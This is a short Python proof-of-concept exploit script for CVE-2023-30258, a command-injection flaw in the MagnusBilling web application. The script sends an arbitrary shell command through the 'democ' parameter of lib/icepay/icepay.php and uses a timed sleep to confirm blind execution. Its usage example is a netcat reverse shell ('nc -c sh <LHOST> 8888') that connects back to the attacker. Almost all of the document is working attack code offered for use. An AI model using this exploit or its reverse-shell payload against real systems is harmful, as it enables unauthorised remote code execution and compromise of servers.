#!/usr/bin/env python
# -*- coding: UTF-8 -*-
'''
@Project ：CVE-2023-30258-RCE-POC
@File    ：poc.py
@Author  ：n0o0b
@Date    ：2025/3/25 23:59
'''

import argparse
import requests
import time

def attacking(url, cmd):
    if url[-1] != "/":
        url += "/"
    try:
        start_time = time.time()  # Get the current time
        print(url + f"lib/icepay/icepay.php?democ=;{requests.utils.quote(cmd, safe='')};sleep 2;")
        res=requests.get(url + f"lib/icepay/icepay.php?democ=;{requests.utils.quote(cmd, safe='')};sleep 2;")
        print(res.text)
        end_time = time.time()  # Record the end time
        # Calculate the elapsed time
        elapsed_time = end_time - start_time
        if elapsed_time > 2 :#and res.status_code == 200
            print("exec 5ucc3s5!!!Bu4 n0 re5p0ns3....")
        else:
            print("fxxk fail")
    except Exception as e:
	    print(f"An error occurred: {e}")

def main():
    parser = argparse.ArgumentParser(description='''example. 
                                                 python poc.py -u http://<Target-IP>/mbilling --cmd \"nc -c sh <LHOST> 8888\"''')
    parser.add_argument("-u", "--url", type=str, help="Target URL")
    parser.add_argument("-c", "--cmd", type=str, help="Command to execute")
    args = parser.parse_args()

    if args.url:
        print(f"Target URL: {args.url}")
    if args.cmd:
        print(f"Executing command: {args.cmd}")

    if not any(vars(args).values()):
        parser.print_help()
        return

    attacking(args.url, args.cmd)

if __name__ == "__main__":
    main()
